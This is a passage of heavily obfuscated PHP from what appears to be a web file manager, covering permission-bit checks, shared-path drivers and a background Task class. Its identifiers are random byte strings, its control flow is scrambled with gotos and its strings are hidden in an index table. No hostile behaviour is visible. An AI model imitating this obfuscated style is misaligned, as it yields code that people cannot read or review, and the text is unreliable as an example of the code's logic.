return self::authCheck($a³›Š ‹Ù, self::AUTH_REMOVE); } public static function authCheckShare($B Šˆ³õê°) { return self::authCheck($B Šˆ³õê°, self::AUTH_SHARE); } public static function authCheckComment($d¦á«¼ùö¾) { return self::authCheck($d¦á«¼ùö¾, self::AUTH_COMMENT); } public static function authCheckEvent($e™İ¤À³£ˆ) { return self::authCheck($e™İ¤À³£ˆ, self::AUTH_EVENT); } public static function authCheckRoot($cƒ¥Æ§Šã) { return self::authCheck($cƒ¥Æ§Šã, self::AUTH_ROOT); } public static function authCheckAction($fõÙ„ôù©», $C§³ùËÄ‘³) { goto DÓ‘å®îĞ; D»¤Ê¶ã¨Ø: if (($fõÙ„ôù©» & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($fõÙ„ôù©» & $bäîìËéß); goto F¡Á¬“ˆ¢¡; d‹¥šğ®‡Ì: $bäîìËéß = $bù„Ôáà·[$C§³ùËÄ‘³]; $fõÙ„ôù©» = intval($fõÙ„ôù©»); if ($fõÙ„ôù©» <= 0) { return !1; } goto D»¤Ê¶ã¨Ø; DÓ‘å®îĞ: $b›‰ ‹Ü‚ê =& $_SERVER[Š‰]; $bù„Ôáà· = array($b›‰ ‹Ü‚ê[1682] => self::AUTH_VIEW, $b›‰ ‹Ü‚ê[1070] => self::AUTH_DOWNLOAD, $b›‰ ‹Ü‚ê[106] => self::AUTH_UPLOAD, $b›‰ ‹Ü‚ê[1630] => self::AUTH_EDIT, $b›‰ ‹Ü‚ê[1629] => self::AUTH_REMOVE, $b›‰ ‹Ü‚ê[1640] => self::AUTH_SHARE, $b›‰ ‹Ü‚ê[350] => self::AUTH_COMMENT, $b›‰ ‹Ü‚ê[1489] => self::AUTH_EVENT, $b›‰ ‹Ü‚ê[1683] => self::AUTH_ROOT); if (!isset($bù„Ôáà·[$C§³ùËÄ‘³])) { return; } goto d‹¥šğ®‡Ì; F¡Á¬“ˆ¢¡: } public static function authDisable($A¿–¶Ï‹‚, $EĞ´ÄºŒê) { if (intval($A¿–¶Ï‹‚) <= 0) { return 0; } return intval($A¿–¶Ï‹‚) & ~$EĞ´ÄºŒê; } public $optionType = "\x53\x79\163\x74\x65\x6d\56\x73\157\165\x72\x63\x65\101\x75\164\x68\x4c\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\141\x75\x74\x68", "\x6c\141\x62\x65\154", "\144\x69\x73\160\x6c\141\x79", "\163\x79\x73\164\145\x6d", "\163\157\x72\x74"); public function initData() { $bù­ÄÇÛ•ç = $this->authDefault(); foreach ($bù­ÄÇÛ•ç as $c§…Æøñö·) { $this->add($c§…Æøñö·); } } public function listData($b·ÎŠªˆ­ò = false, $DÖÕ®Šç = "\x73\x6f\162\x74", $AààÃ­Ûô = false) { return parent::listData($b·ÎŠªˆ­ò, $DÖÕ®Šç, $AààÃ­Ûô); } public function update($e¨•œÆÊ, $cæö¤…‡‘) { $Aìß„ÂŒö =& $_SERVER[Š‰]; $E„›çÒ«¹ = parent::listData($e¨•œÆÊ); $c™£î´ØÔ­ = $this->findByName($cæö¤…‡‘[$Aìß„ÂŒö[28]]); if (!$E„›çÒ«¹ || $c™£î´ØÔ­ && $c™£î´ØÔ­[$Aìß„ÂŒö[388]] != $E„›çÒ«¹[$Aìß„ÂŒö[388]]) { return !1; } $this->filterAuth($cæö¤…‡‘[$Aìß„ÂŒö[400]]); return parent::update($e¨•œÆÊ, $cæö¤…‡‘); } public function remove($eÉ† ¢§Ó¹) { $Eìîã¬ÂÀ½ = parent::listData($eÉ† ¢§Ó¹); if (!$Eìîã¬ÂÀ½ || $Eìîã¬ÂÀ½[$_SERVER[Š‰][1145]]) { return !1; } return parent::remove($eÉ† ¢§Ó¹); } public function add($E‘„ßÊ‡ = array()) { goto Dô‚½°½Â§; bÎ·¨«ÌÈå: return parent::insert($E‘„ßÊ‡); goto aµ©¬¡É; eÌÊƒ½¬ˆ¦: $E‘„ßÊ‡ = array_merge($Bç‚ÁµÒšŒ, $E‘„ßÊ‡); $E‘„ßÊ‡[$fÚŒŠºİ‡¥[1686]] = $this->getSort(); $this->filterAuth($E‘„ßÊ‡[$fÚŒŠºİ‡¥[400]]); goto bÎ·¨«ÌÈå; Dô‚½°½Â§: $fÚŒŠºİ‡¥ =& $_SERVER[Š‰]; if ($this->findByName($E‘„ßÊ‡[$fÚŒŠºİ‡¥[28]])) { return !1; } $Bç‚ÁµÒšŒ = array($fÚŒŠºİ‡¥[28] => $fÚŒŠºİ‡¥[33], $fÚŒŠºİ‡¥[400] => 1, $fÚŒŠºİ‡¥[1684] => $fÚŒŠºİ‡¥[1673], $fÚŒŠºİ‡¥[1685] => 1, $fÚŒŠºİ‡¥[1145] => 0, $fÚŒŠºİ‡¥[1686] => 0); goto eÌÊƒ½¬ˆ¦; aµ©¬¡É: } private function getSort() { $fšÏèäİ±š =& $_SERVER[Š‰]; $C´¿“éŠÑÄ = parent::listData(); $F²ÚÑ×¼ = array_to_keyvalue($C´¿“éŠÑÄ, $fšÏèäİ±š[33], $fšÏèäİ±š[1686]); return empty($F²ÚÑ×¼) ? 0 : max($F²ÚÑ×¼) + 1; } private function filterAuth(&$dÇ×²æÛ„„) { goto CÇ½†Ë†ëÚ; CÇ½†Ë†ëÚ: if (!$dÇ×²æÛ„„) { return; } $A…øªµù“® = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Fá…É–¸å¡ = array(); goto FÓ„’ÇŒåÙ; FÓ„’ÇŒåÙ: foreach ($A…øªµù“® as $eİ‡Æ¦£™ñ) { if ($dÇ×²æÛ„„ & $eİ‡Æ¦£™ñ) { $Fá…É–¸å¡[] = $eİ‡Æ¦£™ñ; } } if (in_array(self::AUTH_ROOT, $Fá…É–¸å¡)) { $dÇ×²æÛ„„ = array_sum($A…øªµù“®); return; } $AÌ´×È“˜© = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto BÀ»Šù¾Ó; BÀ»Šù¾Ó: foreach ($Fá…É–¸å¡ as $eİ‡Æ¦£™ñ) { if (isset($AÌ´×È“˜©[$eİ‡Æ¦£™ñ])) { $Fá…É–¸å¡ = array_merge($Fá…É–¸å¡, $AÌ´×È“˜©[$eİ‡Æ¦£™ñ]); } } $Fá…É–¸å¡[] = self::AUTH_SHOW; $dÇ×²æÛ„„ = array_sum(array_unique($Fá…É–¸å¡)); goto e¿¨ƒÀ¥ä; e¿¨ƒÀ¥ä: } public function sort($eµ¹´‡²ë¨, $EÜšÓê¹±œ) { return parent::update($eµ¹´‡²ë¨, $EÜšÓê¹±œ); } } goto a×¿š¶œÂ‡; BëŒ‘ÂŸù: class PathDriverDbShareItem extends PathDriverDB { public function __construct($dŠ­–‘»Ÿ) { $this->pathParse = $dŠ­–‘»Ÿ; $this->model = Model($_SERVER[Š‰][1180]); } public function getPathOuter($Döã«×±‘ğ) { $c¯·í ò«Â =& $_SERVER[Š‰]; if (!$Döã«×±‘ğ) { return $Döã«×±‘ğ; } $aÕïÆòí÷Î = $this->parse($Döã«×±‘ğ); return trim(KodIO::makeShare($this->pathParse[$c¯·í ò«Â[388]], $aÕïÆòí÷Î[$c¯·í ò«Â[388]]), $c¯·í ò«Â[8]); } protected function infoParse($a·†Ğ²õâ, $C†•ÈÑÎì¥ = false, $AöÏ£……±© = false) { $a‘‡Ûê›± =& $_SERVER[Š‰]; $D¡±ÍÊÚòñ = $this->pathParse[$a‘‡Ûê›±[388]]; $Cì–ÓÉ¿£¢ = trim($this->pathParse[$a‘‡Ûê›±[1040]], $a‘‡Ûê›±[8]); return Action($a‘‡Ûê›±[1187])->sharePathInfo($D¡±ÍÊÚòñ, $Cì–ÓÉ¿£¢); } public function infoFull($dï‰Ì®„Ñå) { $dÀÊ·±¼Ô¸ =& $_SERVER[Š‰]; $d§ã®ŞË¾Ş = explode($dÀÊ·±¼Ô¸[8], trim($dï‰Ì®„Ñå, $dÀÊ·±¼Ô¸[8])); if (count($d§ã®ŞË¾Ş) > 1) { $c‘»‚Ù…”Ş = implode($dÀÊ·±¼Ô¸[8], array_splice($d§ã®ŞË¾Ş, 1)); $C¯˜¸“êŒÇ = $this->model->pathInfoByPath($d§ã®ŞË¾Ş[0], $c‘»‚Ù…”Ş); if (!$C¯˜¸“êŒÇ) { return !1; } $this->pathParse[$dÀÊ·±¼Ô¸[1040]] = $C¯˜¸“êŒÇ[$dÀÊ·±¼Ô¸[390]]; } return $this->infoParse($dï‰Ì®„Ñå); } public function listAll($DŠ÷ÚÏ½«î) { goto DÒ×˜à®çâ; bèæÑ¡–‰ä: foreach ($eÖæ’ÃÒßù as &$B¢‡ºæİ÷) { check_abort(); $B¢‡ºæİ÷[$e‚‰êÏëÎ[84]] = $dğ‚ÜÇßÏ‚->_shareItemeParse($B¢‡ºæİ÷[$e‚‰êÏëÎ[84]], $F‡äÑ¬·§); } unset($B¢‡ºæİ÷); return $eÖæ’ÃÒßù; goto F‡õ“©®; DÒ×˜à®çâ: $e‚‰êÏëÎ =& $_SERVER[Š‰]; $f¸Ñ™ÛÖ¸ = IO::info($this->pathParse[$e‚‰êÏëÎ[75]]); if (!$f¸Ñ™ÛÖ¸) { return array(); } goto Fì±·è¯ªª; Fì±·è¯ªª: $eÖæ’ÃÒßù = $this->model->listAll($DŠ÷ÚÏ½«î); $F‡äÑ¬·§ = Model($e‚‰êÏëÎ[558])->getInfo($f¸Ñ™ÛÖ¸[$e‚‰êÏëÎ[462]]); $dğ‚ÜÇßÏ‚ = Action($e‚‰êÏëÎ[1187]); goto bèæÑ¡–‰ä; F‡õ“©®: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($d£ÚÚ‚³¤) { $this->pathParse = $d£ÚÚ‚³¤; $this->model = Model($_SERVER[Š‰][1180]); } protected function infoParse($dÏÚ¢—ïç, $Dì¨ÄÓß“á = false, $c¢…ï¨¤Ğ = false) { $b„ëÛ§éÃŠ =& $_SERVER[Š‰]; return Action($b„ëÛ§éÃŠ[1046])->sharePathInfo($this->pathParse[$b„ëÛ§éÃŠ[75]], !0); } public function listPath($E¸³Ñ±÷Úâ, $A˜ä‚»àËÃ = false) { $b®ÓÆö˜ìù =& $_SERVER[Š‰]; $a—ÆƒÆ­¨‹ = parent::listPath($E¸³Ñ±÷Úâ, $A˜ä‚»àËÃ); foreach ($a—ÆƒÆ­¨‹ as $Bä’Øòªô§ => $bŠ¯•„ä¨¤) { if (!in_array($Bä’Øòªô§, array($b®ÓÆö˜ìù[73], $b®ÓÆö˜ìù[74]))) { continue; } foreach ($bŠ¯•„ä¨¤ as $A¸Ö˜¶¸Éç => $BºİË±) { $a—ÆƒÆ­¨‹[$Bä’Øòªô§][$A¸Ö˜¶¸Éç] = Action($b®ÓÆö˜ìù[1046])->shareItemInfo($BºİË±); } } return $a—ÆƒÆ­¨‹; } public function listAll($eÍ…À¦é‰) { goto a‰À¥à×—; Aà…ÓõŠ: return $bØÄîÉ¯–; goto EŒ£½É«; B×‹ÁğÑ»ã: $bØÄîÉ¯– = $this->model->listAll($eÍ…À¦é‰); foreach ($bØÄîÉ¯– as &$Føç’°³Ÿš) { $Føç’°³Ÿš[$A­˜Õ¡¯·[84]] = Action($A­˜Õ¡¯·[1046])->shareItemInfo($Føç’°³Ÿš[$A­˜Õ¡¯·[84]]); } unset($Føç’°³Ÿš); goto Aà…ÓõŠ; a‰À¥à×—: $A­˜Õ¡¯· =& $_SERVER[Š‰]; $fÛ¥¹ğ•ô¨ = IO::info($this->pathParse[$A­˜Õ¡¯·[75]]); if (!$fÛ¥¹ğ•ô¨) { return array(); } goto B×‹ÁğÑ»ã; EŒ£½É«: } } class PathDriverDriverShareItem { public function __construct($FœâÓ¢¯¿ò) { $this->pathParse = $FœâÓ¢¯¿ò; } public function __call($BİŒä‚åÓÖ, $F‰õ¯—Ÿ„ø) { $fœÁ—§Âˆ =& $_SERVER[Š‰]; if (method_exists($this, $BİŒä‚åÓÖ)) { return; } $f‡ªÌóƒ§‘ = call_user_func_array(array($fœÁ—§Âˆ[1188], $BİŒä‚åÓÖ), $F‰õ¯—Ÿ„ø); $CÎ¤—‚¦—ã = array($fœÁ—§Âˆ[1189], $fœÁ—§Âˆ[1190], $fœÁ—§Âˆ[1191], $fœÁ—§Âˆ[1192], $fœÁ—§Âˆ[513], $fœÁ—§Âˆ[515], $fœÁ—§Âˆ[1193], $fœÁ—§Âˆ[106], $fœÁ—§Âˆ[1194], $fœÁ—§Âˆ[1195]); if (in_array($BİŒä‚åÓÖ, $CÎ¤—‚¦—ã)) { $f‡ªÌóƒ§‘ = $this->getPathOuter($f‡ªÌóƒ§‘); } return $f‡ªÌóƒ§‘; } public function copy($E¹ƒÙìî, $AãÃ‹“æÕ, $A‚†‹àÎ³– = false) { return $this->copyMove($E¹ƒÙìî, $AãÃ‹“æÕ, $A‚†‹àÎ³–, $_SERVER[Š‰][513]); } public function move($dêÉ’³ÅËÄ, $fèˆÎ¦ÕÄ, $d·Àì¶¾ = false) { return $this->copyMove($dêÉ’³ÅËÄ, $fèˆÎ¦ÕÄ, $d·Àì¶¾, $_SERVER[Š‰][515]); } private function copyMove($bÆæ¬‘íôé, $B¸š‰Ñİ¢•, $D–óÉ•œ, $aæ–¹¿â‡£) { goto AãğŸóŞ“; FŞ¶°õè—: if ($D¤š‹Öæ®->pathParse[$e¸È¯ Î¨[1024]]) { $B¸š‰Ñİ¢• = $D¤š‹Öæ®->pathParse[$e¸È¯ Î¨[1024]]; } else { $B¸š‰Ñİ¢• = $càò¨ö¸£õ; } $AñÙÂó× = IO::copyMove($bÆæ¬‘íôé, $B¸š‰Ñİ¢•, $D–óÉ•œ, $aæ–¹¿â‡£); $AñÙÂó× = $this->getPathOuter($AñÙÂó×); goto aØª‡×‘çä; AãğŸóŞ“: $e¸È¯ Î¨ =& $_SERVER[Š‰]; $càò¨ö¸£õ = $B¸š‰Ñİ¢•; $D¤š‹Öæ® = IO::driverMake($B¸š‰Ñİ¢•); goto FŞ¶°õè—; aØª‡×‘çä: return $AñÙÂó×; goto añÁ³ŒÏÇ§; añÁ³ŒÏÇ§: } public function pathThis($Eä·È‚Å÷£) { return get_path_this($this->pathParse[$_SERVER[Š‰][75]]); } public function pathFather($a™›ñ•¬—„) { return get_path_father($this->pathParse[$_SERVER[Š‰][75]]); } public function iconvSystem($A¼ä”¼ˆ¼ê) { return $A¼ä”¼ˆ¼ê; } protected function infoParse($e¡İŠéì“Û, $aÍÕ÷é¶ã = false) { $B©¯ÁÓ¯  =& $_SERVER[Š‰]; $E™‡‘‘ƒŸá = $this->pathParse[$B©¯ÁÓ¯ [460]][$B©¯ÁÓ¯ [1047]] . $this->pathParse[$B©¯ÁÓ¯ [1040]]; if ($aÍÕ÷é¶ã) { $eïœÂ£ˆæ‚ = IO::infoWithChildren($E™‡‘‘ƒŸá); } else { $eïœÂ£ˆæ‚ = IO::info($E™‡‘‘ƒŸá); } $D®‚ÃÏïœ = $this->pathParse[$B©¯ÁÓ¯ [460]]; return Action($B©¯ÁÓ¯ [1187])->_shareItemeParse($eïœÂ£ˆæ‚, $D®‚ÃÏïœ); } public function listAll($BÏ‡®ç“¿ë) { $aÀ õËº¿ =& $_SERVER[Š‰]; $CÉé£À = IO::listAll($BÏ‡®ç“¿ë); $cãã¤İÀ = $this->pathParse[$aÀ õËº¿[460]]; foreach ($CÉé£À as &$dÙ–×‚Å¨) { check_abort(); $dÙ–×‚Å¨ = array_merge(IO::info($dÙ–×‚Å¨[$aÀ õËº¿[75]]), $dÙ–×‚Å¨); $dÙ–×‚Å¨[$aÀ õËº¿[84]] = Action($aÀ õËº¿[1187])->_shareItemeParse($dÙ–×‚Å¨, $cãã¤İÀ); } unset($dÙ–×‚Å¨); return $CÉé£À; } public function getPathOuter($E ·¥§¨¬) { goto b‹¨ƒÏŠ¥î; d¥ŸåëÉø‹: $Fœ§Øîª×İ = KodIO::clear($E ·¥§¨¬); $e³ŒÚã„‘È = KodIO::clear($this->pathParse[$d”½Ã‘—™[460]][$d”½Ã‘—™[1047]]); $f‡…º¤ø = substr($Fœ§Øîª×İ, strlen($e³ŒÚã„‘È)); goto bÃíÄõ±é; bÃíÄõ±é: if (substr($Fœ§Øîª×İ, 0, strlen($e³ŒÚã„‘È)) != $e³ŒÚã„‘È) { return !1; } return $this->pathParse[$d”½Ã‘—™[1041]] . $d”½Ã‘—™[8] . ltrim($f‡…º¤ø, $d”½Ã‘—™[8]); goto Cíï™Œ‹ì; b‹¨ƒÏŠ¥î: $d”½Ã‘—™ =& $_SERVER[Š‰]; $b¦Ú¶½Ä = KodIO::parse($E ·¥§¨¬); if ($b¦Ú¶½Ä[$d”½Ã‘—™[29]] == KodIO::KOD_SHARE_ITEM) { return $b¦Ú¶½Ä[$d”½Ã‘—™[75]]; } goto d¥ŸåëÉø‹; Cíï™Œ‹ì: } public function getType() { $eí»è·¡² =& $_SERVER[Š‰]; $E–«¿³ª¡ = str_replace($eí»è·¡²[71], $eí»è·¡²[33], get_class($this)); return strtolower($E–«¿³ª¡); } public function isTypeObject($f•¥çéµŞò) { return IO::isTypeObject($f•¥çéµŞò); } public function info($d–¿å™«Ù) { return $this->infoParse($d–¿å™«Ù); } public function infoAuth($eõ›·Ÿ©Ãˆ) { return $this->infoParse($eõ›·Ÿ©Ãˆ); } public function infoWithChildren($E×Îô‘ëÈ©) { return $this->infoParse($E×Îô‘ëÈ©, !0); } public function infoFull($eæ¸Ÿ‡ÒÕ•) { return $this->infoParse($eæ¸Ÿ‡ÒÕ•); } } goto DŠÖÑÚ™¿; a… á’ö¶¢: class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\162\x75\x6e\156\x69\x6e\147"; const STATYS_KILL = "\153\x69\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($Bòà½Ü³ˆ, $bùåâØ¶‹Ï = '', $f‚³¦È·… = 0, $DŒƒÀ¾ = '') { goto cŒãÍèÂÎ˜; Fƒ¯ùŠ­²: $this->startAfter(); Hook::trigger($e¡‰¬Õ„‡[1510], $this->task); $this->task[$e¡‰¬Õ„‡[1503]] = timeFloat(); goto EöÏ‹ìîÑ; cŒãÍèÂÎ˜: $e¡‰¬Õ„‡ =& $_SERVER[Š‰]; if (self::get($Bòà½Ü³ˆ)) { return; } $this->task = array($e¡‰¬Õ„‡[388] => $Bòà½Ü³ˆ, $e¡‰¬Õ„‡[1500] => USER_ID, $e¡‰¬Õ„‡[1405] => $DŒƒÀ¾, $e¡‰¬Õ„‡[29] => $bùåâØ¶‹Ï, $e¡‰¬Õ„‡[1000] => $e¡‰¬Õ„‡[33], $e¡‰¬Õ„‡[998] => $f‚³¦È·…, $e¡‰¬Õ„‡[1012] => 0, $e¡‰¬Õ„‡[1501] => 0, $e¡‰¬Õ„‡[1502] => 0, $e¡‰¬Õ„‡[733] => timeFloat(), $e¡‰¬Õ„‡[732] => 0, $e¡‰¬Õ„‡[1503] => 0, $e¡‰¬Õ„‡[1504] => 0, $e¡‰¬Õ„‡[1505] => 0, $e¡‰¬Õ„‡[702] => $e¡‰¬Õ„‡[1463]); goto CÖì»ŒìÚ; CÖì»ŒìÚ: $GLOBALS[$e¡‰¬Õ„‡[1506]] = 1; Hook::bind($e¡‰¬Õ„‡[1465], array($this, $e¡‰¬Õ„‡[1507])); Hook::bind($e¡‰¬Õ„‡[1508], array($this, $e¡‰¬Õ„‡[1509])); goto Fƒ¯ùŠ­²; EöÏ‹ìîÑ: } public function end() { goto bì¬¶Œ‚; B‹å¨¾ëÊ¦: Hook::unbind($B¥¤¥÷Ñ„Ü[1508], array($this, $B¥¤¥÷Ñ„Ü[1509])); $this->endAfter(); $this->task = !1; goto bÅÇŸ¦­°; f©Èì¼¿: $BÚİ†‘ÚÚé = timeFloat() - $this->task[$B¥¤¥÷Ñ„Ü[733]]; self::log($B¥¤¥÷Ñ„Ü[1511] . $this->task[$B¥¤¥÷Ñ„Ü[388]] . $B¥¤¥÷Ñ„Ü[1512] . $BÚİ†‘ÚÚé . $B¥¤¥÷Ñ„Ü[1513]); Hook::unbind($B¥¤¥÷Ñ„Ü[1465], array($this, $B¥¤¥÷Ñ„Ü[1507])); goto B‹å¨¾ëÊ¦; bì¬¶Œ‚: $B¥¤¥÷Ñ„Ü =& $_SERVER[Š‰]; if (!$this->task) { return; } if ($this->task[$B¥¤¥÷Ñ„Ü[1503]]) { self::valueSet($this->task[$B¥¤¥÷Ñ„Ü[388]], !1); } goto f©Èì¼¿; bÅÇŸ¦­°: } public function update($c¡ŸæŸÕ„Ú = 0, $fîÂ’ËµŠ = false) { goto DÚÛÊ±•®ñ; D¸èÀ´ò–ò: Hook::trigger($eã¾ïç·¨È[1517], $Bç«ôİøíò); self::valueSet($Bç«ôİøíò[$eã¾ïç·¨È[388]], $Bç«ôİøíò); goto A²ºòÒ; DÚÛÊ±•®ñ: $eã¾ïç·¨È =& $_SERVER[Š‰]; $Bç«ôİøíò =& $this->task; if (!$Bç«ôİøíò) { return; } goto eöìÃ§…Ôì; eöìÃ§…Ôì: $Bç«ôİøíò[$eã¾ïç·¨È[1012]] += $c¡ŸæŸÕ„Ú; $Bç«ôİøíò[$eã¾ïç·¨È[732]] = timeFloat(); if ($Bç«ôİøíò[$eã¾ïç·¨È[998]]) { if ($Bç«ôİøíò[$eã¾ïç·¨È[998]] < $Bç«ôİøíò[$eã¾ïç·¨È[1012]]) { $Bç«ôİøíò[$eã¾ïç·¨È[998]] = $Bç«ôİøíò[$eã¾ïç·¨È[1012]]; } $FÆùÅ¥¥ä = timeFloat() - $Bç«ôİøíò[$eã¾ïç·¨È[733]] - $Bç«ôİøíò[$eã¾ïç·¨È[1504]]; $Bç«ôİøíò[$eã¾ïç·¨È[1501]] = $Bç«ôİøíò[$eã¾ïç·¨È[1012]] / $Bç«ôİøíò[$eã¾ïç·¨È[998]]; $Bç«ôİøíò[$eã¾ïç·¨È[1502]] = $Bç«ôİøíò[$eã¾ïç·¨È[1012]] / $FÆùÅ¥¥ä; if ($Bç«ôİøíò[$eã¾ïç·¨È[1501]] > 0) { $Bç«ôİøíò[$eã¾ïç·¨È[1505]] = $FÆùÅ¥¥ä * (1 - $Bç«ôİøíò[$eã¾ïç·¨È[1501]]) / $Bç«ôİøíò[$eã¾ïç·¨È[1501]]; } $Bç«ôİøíò[$eã¾ïç·¨È[1505]] = $Bç«ôİøíò[$eã¾ïç·¨È[1505]] <= 0 ? 0 : $Bç«ôİøíò[$eã¾ïç·¨È[1505]]; } goto FŞ¤ß’•œ; FŞ¤ß’•œ: $this->updateAfter(); $câ††·ƒ–¿ = 0.2; if (timeFloat() - $Bç«ôİøíò[$eã¾ïç·¨È[1503]] < $câ††·ƒ–¿ && !$fîÂ’ËµŠ) { return; } goto D•ì°»Ş´ò; D•ì°»Ş´ò: $Cµ£çƒÃí‡ = self::get($Bç«ôİøíò[$eã¾ïç·¨È[388]]); $e³ÛÑí·Èï = $Cµ£çƒÃí‡[$eã¾ïç·¨È[702]]; if ($e³ÛÑí·Èï == self::STATYS_KILL) { $EõÏ‰–¡³ = array($eã¾ïç·¨È[1514] => LNG($eã¾ïç·¨È[1515]), $eã¾ïç·¨È[1062] => !1); Cache::set($eã¾ïç·¨È[1516] . $this->task[$eã¾ïç·¨È[388]], $EõÏ‰–¡³, 30); $this->end(); die; } else { if ($e³ÛÑí·Èï == self::STATYS_STOP) { $bÅ¬‡Ú—²Ã = 2; $Cµ£çƒÃí‡[$eã¾ïç·¨È[1504]] += $bÅ¬‡Ú—²Ã; self::valueSet($Bç«ôİøíò[$eã¾ïç·¨È[388]], $Cµ£çƒÃí‡); sleep($bÅ¬‡Ú—²Ã); $this->update(); return; } } goto C½”Ğƒ§–; C½”Ğƒ§–: $Bç«ôİøíò[$eã¾ïç·¨È[702]] = $e³ÛÑí·Èï ? $e³ÛÑí·Èï : $Bç«ôİøíò[$eã¾ïç·¨È[702]]; $Bç«ôİøíò[$eã¾ïç·¨È[1504]] = $Cµ£çƒÃí‡[$eã¾ïç·¨È[1504]] ? $Cµ£çƒÃí‡[$eã¾ïç·¨È[1504]] : 0; $Bç«ôİøíò[$eã¾ïç·¨È[1503]] = timeFloat(); goto D¸èÀ´ò–ò; A²ºòÒ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($b³£ ½ØŒ…) { $FÑ‡´´éÓ =& $_SERVER[Š‰]; Cache::set($FÑ‡´´éÓ[1516] . $this->task[$FÑ‡´´éÓ[388]], $b³£ ½ØŒ…, 60); return $b³£ ½ØŒ…; } public static function get($aÏ²½†çŸ¦) { return self::valueGet($aÏ²½†çŸ¦); } public static function listData() { $BØ±²¨¼¡‡ = self::valueGet(); return array_sort_by($BØ±²¨¼¡‡, $_SERVER[Š‰][733], !0); } public static function kill($f¨Œª¢¡·ö) { return self::changeStatus($f¨Œª¢¡·ö, self::STATYS_KILL); } public static function stop($E­ƒ¤Ù·íƒ) { return self::changeStatus($E­ƒ¤Ù·íƒ, self::STATYS_STOP); } public static function restart($FğÊÏËˆõŸ) { return self::changeStatus($FğÊÏËˆõŸ, self::STATYS_RUNNING); } public static function killAll() { $d˜í½œØÌ÷ =& $_SERVER[Š‰]; $AëïØ…ëË = self::listData(); foreach ($AëïØ…ëË as $A©¼ŒÉ˜) { self::kill($A©¼ŒÉ˜[$d˜í½œØÌ÷[388]]); } sleep(2); foreach ($AëïØ…ëË as $A©¼ŒÉ˜) { self::valueSet($A©¼ŒÉ˜[$d˜í½œØÌ÷[388]], !1); } } private static function changeStatus($côŞÌøœºØ, $b’Ï”˜×î¶) { goto cô² “«äª; BŒÜÚ›“×¹: $D¦Ë×Ö£¯±[$d‚´¥˜¿˜´[702]] = $b’Ï”˜×î¶; self::valueSet($côŞÌøœºØ, $D¦Ë×Ö£¯±); self::log($d‚´¥˜¿˜´[1518] . $D¦Ë×Ö£¯±[$d‚´¥˜¿˜´[388]] . $d‚´¥˜¿˜´[1519] . $b’Ï”˜×î¶); goto d§Î²÷ğÓ©; d§Î²÷ğÓ©: return !0; goto Eì¸„‚ñåÖ; cô² “«äª: $d‚´¥˜¿˜´ =& $_SERVER[Š‰]; $D¦Ë×Ö£¯± = self::valueGet($côŞÌøœºØ); if (!$D¦Ë×Ö£¯±) { return !1; } goto BŒÜÚ›“×¹; Eì¸„‚ñåÖ: } public static function valueGet($aŞ÷˜¾ˆ©œ = false) { $eˆ®é¡’ª =& $_SERVER[Š‰]; if ($aŞ÷˜¾ˆ©œ) { $dĞê¶µ¡—‚ = Model($eˆ®é¡’ª[419])->where(array($eˆ®é¡’ª[92] => $aŞ÷˜¾ˆ©œ, $eˆ®é¡’ª[29] => $eˆ®é¡’ª[1520]))->find(); return $dĞê¶µ¡—‚ ? json_decode($dĞê¶µ¡—‚[$eˆ®é¡’ª[370]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Aì¬ğÙ²ß‹ = false) { goto cå‹ÛÉ¶éÎ; fÜ‹à¡¥Å”: return $eˆ“¹êˆÖ; goto b¼¦¼˜–·š; cå‹ÛÉ¶éÎ: $Cƒ‹¿ òö· =& $_SERVER[Š‰]; $bé‰âñè» = array($Cƒ‹¿ òö·[29] => $Cƒ‹¿ òö·[1520]); if ($Aì¬ğÙ²ß‹) { $bé‰âñè»[$Cƒ‹¿ òö·[1500]] = $Aì¬ğÙ²ß‹; } goto E…œÓƒµê¼; E…œÓƒµê¼: $eˆ“¹êˆÖ = Model($Cƒ‹¿ òö·[419])->where($bé‰âñè»)->select(); $eˆ“¹êˆÖ = $eˆ“¹êˆÖ ? $eˆ“¹êˆÖ : array(); foreach ($eˆ“¹êˆÖ as $A«ÇœÀñ¶Ì => $e¸¬÷ÕÀÕŞ) { $eˆ“¹êˆÖ[$A«ÇœÀñ¶Ì] = json_decode($e¸¬÷ÕÀÕŞ[$Cƒ‹¿ òö·[370]], !0); } goto fÜ‹à¡¥Å”; b¼¦¼˜–·š: } public static function valueSet($CçÈ˜ñšáƒ, $EÂ¶èË¶Ï) { goto B˜Ìœ»…Š; E‚Çğ„áåå: if (!$F›Ü²¯…‰¿) { ob_start(); var_dump($EÂ¶èË¶Ï); $fà¬©çÛ = ob_get_clean(); self::log($c¥Ø£í³¿[1521] . json_encode_force($fà¬©çÛ)); } if (!$CçÈ˜ñšáƒ || !$EÂ¶èË¶Ï[$c¥Ø£í³¿[388]]) { return !1; } $c©ÄŠğ¾‚ = array($c¥Ø£í³¿[29] => $c¥Ø£í³¿[1520], $c¥Ø£í³¿[1500] => USER_ID, $c¥Ø£í³¿[92] => $CçÈ˜ñšáƒ, $c¥Ø£í³¿[370] => $F›Ü²¯…‰¿); goto aïáÚ†Ó—œ; B˜Ìœ»…Š: $c¥Ø£í³¿ =& $_SERVER[Š‰]; if (!$EÂ¶èË¶Ï) { return Model($c¥Ø£í³¿[419])->where(array($c¥Ø£í³¿[92] => $CçÈ˜ñšáƒ, $c¥Ø£í³¿[29] => $c¥Ø£í³¿[1520]))->delete(); } $F›Ü²¯…‰¿ = json_encode($EÂ¶èË¶Ï); goto E‚Çğ„áåå; aïáÚ†Ó—œ: Model($c¥Ø£í³¿[419])->add($c©ÄŠğ¾‚, array(), !0); goto aïï¯‰ôØ; aïï¯‰ôØ: } public static function 